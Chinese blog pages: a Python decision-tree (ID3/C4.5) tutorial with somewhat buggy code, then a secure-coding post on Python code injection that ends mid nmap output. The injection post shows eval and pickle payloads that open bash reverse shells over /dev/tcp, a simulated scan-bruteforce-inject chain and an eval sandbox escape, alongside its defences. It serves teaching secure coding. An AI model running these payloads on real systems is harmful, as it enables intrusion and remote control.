<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /data/sever/python/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">决策树算法</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&#x27;xyz&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_shannon_ent</span>(<span class="params">data_set</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算香农熵</span></span><br><span class="line"><span class="string">    :param data_set:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    data_length = <span class="built_in">len</span>(data_set)</span><br><span class="line">    label_counts = Counter([val[-<span class="number">1</span>] <span class="keyword">for</span> val <span class="keyword">in</span> data_set])</span><br><span class="line">    pilog2pi = [val / data_length * math.log(val / data_length, <span class="number">2</span>) <span class="keyword">for</span> val <span class="keyword">in</span> label_counts.itervalues()]</span><br><span class="line">    <span class="keyword">return</span> - reduce(</span><br><span class="line">        operator.add,</span><br><span class="line">        pilog2pi</span><br><span class="line">    ) <span class="keyword">if</span> pilog2pi <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_data_set</span>(<span class="params">data_set, axis, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    分割数据集，筛选指定特征下的数据值的集合</span></span><br><span class="line"><span class="string">    :param data_set: 数据集合</span></span><br><span class="line"><span class="string">    :param axis: 第几列</span></span><br><span class="line"><span class="string">    :param value: 筛选的值</span></span><br><span class="line"><span class="string">    :return: 除去axis列的，并且axis列的值为value的的数据集合</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> [[v <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(val) <span class="keyword">if</span> i != axis] <span class="keyword">for</span> val <span class="keyword">in</span> data_set <span class="keyword">if</span> val[axis] == value]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_best_feature_to_split</span>(<span class="params">data_set</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    选择最好的数据集划分方式</span></span><br><span class="line"><span class="string">    :param data_set: 数据集</span></span><br><span class="line"><span class="string">    :return: 划分方式最好是第几项</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    base_ent = calc_shannon_ent(data_set)</span><br><span class="line">    <span class="comment"># 定义最好的信息增益，信息增益最好的那项</span></span><br><span class="line">    best_info_gain, best_feature = <span class="number">0.0</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data_set[<span class="number">0</span>]) - <span class="number">1</span>):</span><br><span class="line">        unique_value = <span class="built_in">set</span>(data_set[i])</span><br><span class="line">        child_ent = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> val <span class="keyword">in</span> unique_value:</span><br><span class="line">            child_data_set = split_data_set(data_set, i, val)</span><br><span class="line">            child_ent += (<span class="built_in">len</span>(data_set) - <span class="number">1</span>) / <span class="built_in">len</span>(data_set) * calc_shannon_ent(child_data_set)</span><br><span class="line">        <span class="comment"># 信息增益</span></span><br><span class="line">        info_gain = base_ent - child_ent</span><br><span class="line">        <span class="keyword">if</span> info_gain &gt; best_info_gain:</span><br><span class="line">            best_info_gain = info_gain</span><br><span class="line">            best_feature = i</span><br><span class="line">    <span class="keyword">return</span> best_feature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">majority_ent</span>(<span class="params">class_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    取出出现次数最多的标签</span></span><br><span class="line"><span class="string">    :param class_list:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    class_count = Counter(class_list)</span><br><span class="line">    sorted_class_count = <span class="built_in">sorted</span>(class_count.items(), key=<span class="keyword">lambda</span> x, y: cmp(x[<span class="number">1</span>], y[<span class="number">1</span>]), reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> sorted_class_count[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_tree</span>(<span class="params">data_set, labels</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    创建树</span></span><br><span class="line"><span class="string">    :param data_set: 数据集</span></span><br><span class="line"><span class="string">    :param labels: 标签集合</span></span><br><span class="line"><span class="string">    :return: 决策树</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    class_list = [val[-<span class="number">1</span>] <span class="keyword">for</span> val <span class="keyword">in</span> data_set]</span><br><span class="line">    <span class="keyword">if</span> class_list.count(class_list[<span class="number">0</span>]) == <span class="built_in">len</span>(class_list):</span><br><span class="line">        <span class="keyword">return</span> class_list[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data_set[<span class="number">0</span>]) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> majority_ent(class_list)</span><br><span class="line">    best_feat = choose_best_feature_to_split(data_set)</span><br><span class="line">    best_feat_label = labels[best_feat]</span><br><span class="line">    my_tree = &#123;best_feat_label: &#123;&#125;&#125;</span><br><span class="line">    <span class="keyword">del</span> labels[best_feat]</span><br><span class="line">    feat_values = [val[best_feat] <span class="keyword">for</span> val <span class="keyword">in</span> data_set]</span><br><span class="line">    unique_vals = <span class="built_in">set</span>(feat_values)</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> unique_vals:</span><br><span class="line">        sub_labels = labels[:]</span><br><span class="line">        my_tree[best_feat_label][value] = create_tree(split_data_set(data_set, best_feat, value), sub_labels)</span><br><span class="line">    <span class="keyword">return</span> my_tree</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data_set = [[<span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;yes&#x27;</span>], [<span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;yes&#x27;</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="string">&#x27;no&#x27;</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;no&#x27;</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;no&#x27;</span>]]</span><br><span class="line">    <span class="comment"># 计算熵</span></span><br><span class="line">    <span class="built_in">print</span> calc_shannon_ent(data_set)</span><br><span class="line">    <span class="comment"># 分割数据集</span></span><br><span class="line">    <span class="built_in">print</span> split_data_set(data_set, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 获取最大信息增益项</span></span><br><span class="line">    <span class="built_in">print</span> choose_best_feature_to_split(data_set)</span><br><span class="line">    <span class="comment"># 生成决策树</span></span><br><span class="line">    <span class="built_in">print</span> create_tree(data_set, [<span class="string">&#x27;no surfacing&#x27;</span>, <span class="string">&#x27;flippers&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h2 id="ID3算法"><a href="#ID3算法" class="headerlink" title="ID3算法"></a>ID3算法</h2><blockquote>
<p>ID3算法就是在每次需要分裂时，计算每个属性的增益率，然后选择增益率最大的属性进行分裂。</p>
</blockquote>
<h2 id="C4-5算法"><a href="#C4-5算法" class="headerlink" title="C4.5算法"></a>C4.5算法</h2><p>定义分裂信息。<br>$$ split\<em>info_A(D) &#x3D; - \sum</em>{j&#x3D;1}^v \frac{|D_j|}{|D|} log_2(\frac{|D_j|}{|D|}) $$<br>定义增益率。<br>$$ gain\_ratio(A) &#x3D; \frac{gain(A)}{split\_info(A)} $$</p>
<blockquote>
<p>C4.5选择具有最大增益率的属性作为分裂属性。<br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/leoo2sk/archive/2010/09/19/decision-tree.html">http://www.cnblogs.com/leoo2sk/archive/2010/09/19/decision-tree.html</a><br>决策树到底是干嘛用的，怎么去灵活运用决策树？</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/10/16/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/10/16/1.html" class="post-title-link" itemprop="url">Python安全编码-代码注入的实践与防范</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-10-16 00:00:00" itemprop="dateCreated datePublished" datetime="2016-10-16T00:00:00+00:00">2016-10-16</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="什么是代码注入"><a href="#什么是代码注入" class="headerlink" title="什么是代码注入"></a>什么是代码注入</h2><p>代码注入攻击指的是任何允许攻击者在网络应用程序中注入源代码，从而得到解读和执行的方法。</p>
<p>###Python中常见代码注入<br>能够执行一行任意字符串形式代码的eval()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
<p>能够执行字符串形式代码块的exec()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
<p>反序列化一个pickled对象时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pickle.loads(&quot;cposix\nsystem\np0\n(S&#x27;uname -a&#x27;\np1\ntp2\nRp3\n.&quot;)</span><br></pre></td></tr></table></figure>
<p>执行一个Python文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; execfile(&quot;testf.py&quot;)</span><br></pre></td></tr></table></figure>

<p>pickle.loads()代码注入<br>某不安全的用法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def load_session(self, session_id=None):</span><br><span class="line">    if not session_id:</span><br><span class="line">        session_id = self.gen_session_id()</span><br><span class="line">        session = Session(session_id, self)</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            data = self.backend.get(session_id)</span><br><span class="line">            if data:</span><br><span class="line">                data = pickle.loads(data)</span><br><span class="line">                assert type(data) == dict</span><br><span class="line">            else:</span><br><span class="line">                data = &#123;&#125;</span><br><span class="line">        except:</span><br><span class="line">            data = &#123;&#125;</span><br><span class="line">        session = Session(session_id, self, data)</span><br><span class="line">return session</span><br></pre></td></tr></table></figure>
<p>注入的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; class exp(object):</span><br><span class="line">...     def __reduce__(self):</span><br><span class="line">...         s = &quot;/bin/bash -c \&quot;/bin/bash -i &gt; \/dev/tcp/192.168.42.62/12345 0&lt;&amp;1 2&gt;&amp;1 &amp;\&quot;&quot;</span><br><span class="line">...         return (os.system, (s,))</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; e = exp()</span><br><span class="line">&gt;&gt;&gt; e</span><br><span class="line">&lt;__main__.exp object at 0x7f734afa8790&gt;</span><br><span class="line">&gt;&gt;&gt; k = pickle.dumps(e)</span><br><span class="line">&#x27;cposix\nsystem\np0\n(S\&#x27;/bin/bash -c &quot;/bin/bash -i &gt; \\\\/dev/tcp/192.168.42.62/12345 0&lt;&amp;1 2&gt;&amp;1 &amp;&quot;\&#x27;\np1\ntp2\nRp3\n.&#x27;</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; pickle.loads(k)</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[3]+  Stopped                 python</span><br></pre></td></tr></table></figure>


<h3 id="这些函数使用不当都很危险"><a href="#这些函数使用不当都很危险" class="headerlink" title="这些函数使用不当都很危险"></a>这些函数使用不当都很危险</h3><p>os.system<br>os.popen*<br>os.spawn*<br>os.exec*<br>os.open<br>os.popen*<br>commands.*<br>subprocess.popen<br>popen2.*</p>
<h2 id="一次模拟的实践"><a href="#一次模拟的实践" class="headerlink" title="一次模拟的实践"></a>一次模拟的实践</h2><p>通过这次实践发现系统中的诸多安全薄弱的环节，执行流程如下：</p>
<ol>
<li>nmap扫描IP<code> nmap -v -A *.*.*.* -p 1-65535</code>，通过nmap扫描后会发现公开的服务。</li>
<li>暴力破解登录名密码<code> test 123</code>，弱口令登陆系统。这个地方的薄弱点在于开发过程中容易留下便于程序员测试后门或若口令。</li>
<li>成功登陆系统后寻找代码注入点，通过成功找到注入点后可执行代码注入通过反向shell连接服务器提权<code>eval(&quot;__import__(&#39;os&#39;).system(&#39;/bin/bash -c \&quot;/bin/bash -i &gt; /dev/tcp/10.10.10.130/12345 0&lt;&amp;1 2&gt;&amp;1 &amp;\&quot;&#39;)&quot;)</code></li>
</ol>
<p>todo 第三步在整个系统中发现了两个可进行代码注入的漏洞，第一个为pickl反序列化用户登录信息的时候没有做校验，这样当对应的存储介质（memcache、redis）没有开启登录认证并且暴漏在公网中很容易注入代码。第二个为在系统中一些配置直接使用eval函数执行配置中的Python代码进行注入。<br>todo 反向shell介绍</p>
<h2 id="如何安全编码"><a href="#如何安全编码" class="headerlink" title="如何安全编码"></a>如何安全编码</h2><ol>
<li>严格控制输入，过滤所有危险模块，遇到非法字符直接返回。</li>
<li>使用ast.literal_eval()代替eval()</li>
<li>安全使用pickle</li>
</ol>
<p>下面就着几个点来说一下：</p>
<h4 id="eval-方法注释："><a href="#eval-方法注释：" class="headerlink" title="eval()方法注释："></a>eval()方法注释：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(source[, globals[, locals]]) -&gt; value</span><br><span class="line">Evaluate the source in the context of globals and locals. The source may be a string representing a Python expression or a code object as returned by compile(). The globals must be a dictionary and locals can be any mapping, defaulting to the current globals and locals. If only globals is given, locals defaults to it.</span><br></pre></td></tr></table></figure>
<h4 id="ast-literal-eval-方法注释："><a href="#ast-literal-eval-方法注释：" class="headerlink" title="ast.literal_eval()方法注释："></a>ast.literal_eval()方法注释：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safely evaluate an expression node or a string containing a Python expression.  The string or node provided may only consist of the following Python literal structures: strings, numbers, tuples, lists, dicts, booleans, and None.</span><br></pre></td></tr></table></figure>


<h4 id="使用ast-literal-eval-代替eval-对比："><a href="#使用ast-literal-eval-代替eval-对比：" class="headerlink" title="使用ast.literal_eval()代替eval()对比："></a>使用ast.literal_eval()代替eval()对比：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ast.literal_eval(&quot;1+1&quot;)  # ValueError: malformed string</span><br><span class="line">ast.literal_eval(&quot;[1, 2, 3]&quot;)  # [1, 2, 3]</span><br><span class="line">ast.literal_eval(&quot;&#123;1: 1, 2: 2, 3: 3&#125;&quot;)  # &#123;1: 1, 2: 2, 3: 3&#125;</span><br><span class="line">ast.literal_eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;)  # ValueError: malformed string</span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;)  # Linux zhangxu-ThinkPad-T450 3.13.0-92-generic #139-Ubuntu SMP Tue Jun 28 20:42:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;, &#123;&#125;, &#123;&#125;)  # Linux zhangxu-ThinkPad-T450 3.13.0-92-generic #139-Ubuntu SMP Tue Jun 28 20:42:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;, &#123;&quot;__builtins__&quot;: &#123;&#125;&#125;, &#123;&#125;)  # NameError: name &#x27;__import__&#x27; is not defined</span><br></pre></td></tr></table></figure>

<h4 id="eval禁用全局或本地变量："><a href="#eval禁用全局或本地变量：" class="headerlink" title="eval禁用全局或本地变量："></a>eval禁用全局或本地变量：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; global_a = &quot;Hello Eval!&quot;</span><br><span class="line">&gt;&gt;&gt; eval(&quot;global_a&quot;)</span><br><span class="line">&gt;&gt;&gt; eval(&quot;global_a&quot;, &#123;&#125;, &#123;&#125;)</span><br></pre></td></tr></table></figure>


<h4 id="寻找eval的突破点"><a href="#寻找eval的突破点" class="headerlink" title="寻找eval的突破点"></a>寻找eval的突破点</h4><p><code>eval(&quot;[c for c in ().__class__.__bases__[0].__subclasses__()]&quot;, &#123;&#39;__builtins__&#39;:&#123;&#125;&#125;)</code></p>
<p>参考点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">    lambda fc=(</span><br><span class="line">        lambda n: [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == n][0]</span><br><span class="line">    ):</span><br><span class="line">    fc(&quot;function&quot;)(</span><br><span class="line">        fc(&quot;code&quot;)(</span><br><span class="line">            0, 0, 0, 0, &quot;KABOOM&quot;, (), (), (), &quot;&quot;, &quot;&quot;, 0, &quot;&quot;),</span><br><span class="line">        &#123;&#125;)()</span><br><span class="line">)()</span><br></pre></td></tr></table></figure>

<h4 id="安全使用pickle"><a href="#安全使用pickle" class="headerlink" title="安全使用pickle"></a>安全使用pickle</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import hmac</span><br><span class="line">&gt;&gt;&gt; import hashlib</span><br><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; shared_key = &#x27;123456&#x27;</span><br><span class="line">&gt;&gt;&gt; class Exp(object):</span><br><span class="line">...     def __reduce__(self):</span><br><span class="line">...         s = &quot;__import__(&#x27;os&#x27;).system(&#x27;uname -a&#x27;)&quot;</span><br><span class="line">...         return (os.system, (s,))</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; e = Exp()</span><br><span class="line">&gt;&gt;&gt; s = pickle.dumps(e)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">&#x27;cposix\nsystem\np0\n(S&quot;__import__(\&#x27;os\&#x27;).system(\&#x27;uname -a\&#x27;)&quot;\np1\ntp2\nRp3\n.&#x27;</span><br><span class="line">&gt;&gt;&gt; k = hmac.new(shared_key, s, hashlib.sha1).hexdigest()</span><br><span class="line">&gt;&gt;&gt; k</span><br><span class="line">&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d&#x27;</span><br><span class="line">&gt;&gt;&gt; send_s = k + &#x27; &#x27; + s</span><br><span class="line">&gt;&gt;&gt; send_s</span><br><span class="line">&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d cposix\nsystem\np0\n(S&quot;__import__(\&#x27;os\&#x27;).system(\&#x27;uname -a\&#x27;)&quot;\np1\ntp2\nRp3\n.&#x27;</span><br><span class="line">&gt;&gt;&gt; recv_k, recv_s = send_s.split(&#x27; &#x27;, 1)</span><br><span class="line">&gt;&gt;&gt; recv_k, recv_s</span><br><span class="line">(&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d&#x27;, &#x27;cposix\nsystem\np0\n(S&quot;__import__(\&#x27;os\&#x27;).system(\&#x27;uname -a\&#x27;)&quot;\np1\ntp2\nRp3\n.&#x27;)</span><br><span class="line">&gt;&gt;&gt; new_k = hmac.new(shared_key, recv_s, hashlib.sha1).hexdigest()</span><br><span class="line">&gt;&gt;&gt; new_k</span><br><span class="line">&#x27;20bc7b14ee6d2f8109c0fc0561df3db40203622d&#x27;</span><br><span class="line">&gt;&gt;&gt; diff_k = hmac.new(shared_key + &quot;123456&quot;, recv_s, hashlib.sha1).hexdigest()</span><br><span class="line">&gt;&gt;&gt; diff_k</span><br><span class="line">&#x27;381542893003a30d045c5c729713d2aa428128de&#x27;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="如何提高安全编码意识？"><a href="#如何提高安全编码意识？" class="headerlink" title="如何提高安全编码意识？"></a>如何提高安全编码意识？</h3><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="http://www.programcreek.com/python/example/5578/ast.literal_eval">http://www.programcreek.com/python/example/5578/ast.literal_eval</a><br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000002783940">https://segmentfault.com/a/1190000002783940</a><br><a target="_blank" rel="noopener" href="http://www.yunweipai.com/archives/6540.html">http://www.yunweipai.com/archives/6540.html</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/chence19871/article/details/32718219">http://blog.csdn.net/chence19871/article/details/32718219</a><br><a target="_blank" rel="noopener" href="http://coolshell.cn/articles/8711.html">http://coolshell.cn/articles/8711.html</a><br><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/15197673/using-pythons-eval-vs-ast-literal-eval">http://stackoverflow.com/questions/15197673/using-pythons-eval-vs-ast-literal-eval</a><br><a target="_blank" rel="noopener" href="https://www.cigital.com/blog/python-pickling/">https://www.cigital.com/blog/python-pickling/</a><br><a target="_blank" rel="noopener" href="https://github.com/greysign/pysec/blob/master/safeeval.py">https://github.com/greysign/pysec/blob/master/safeeval.py</a></p>
<h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><h4 id="nmap扫描部分结果"><a href="#nmap扫描部分结果" class="headerlink" title="nmap扫描部分结果"></a>nmap扫描部分结果</h4><p>What is nmap?<br>Nmap (Network Mapper) is a security scanner originally written by Gordon Lyon used to discover hosts and services on a computer network, thus creating a “map” of the network.</p>
<p>-A: Enable OS detection, version detection, script scanning, and traceroute<br>-v: Increase verbosity level (use -vv or more for greater effect)<br>-p <port ranges>: Only scan specified ports</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~# nmap -v -A *.*.*.* -p 1-65535 </span><br><span class="line">Starting Nmap 6.25 ( http://nmap.org ) at 2016-07-26 13:30 EDT</span><br><span class="line">......</span><br><span class="line">Not shown: 65527 filtered ports</span><br><span class="line">PORT      STATE  SERVICE     VERSION</span><br><span class="line">139/tcp   open   netbios-ssn</span><br><span class="line">1723/tcp  open   pptp        Microsoft</span><br><span class="line">8891/tcp  open   http        nginx 1.4.4</span><br><span class="line">9090/tcp  closed zeus-admin</span><br><span class="line">13228/tcp open   http        Microsoft IIS httpd 7.5</span><br><span class="line">14580/tcp closed unknown</span><br><span class="line">36666/tcp open   unknown</span><br><span class="line">64380/tcp open   unknown</span><br><span class="line">......</span><br><span class="line">Device type: general purpose|storage-misc</span><br><span class="line">Running (JUST GUESSING): Linux 2.4.X (99%), Microsoft Windows 7 (95%), BlueArc embedded (91%)</span><br><span class="line">OS CPE: 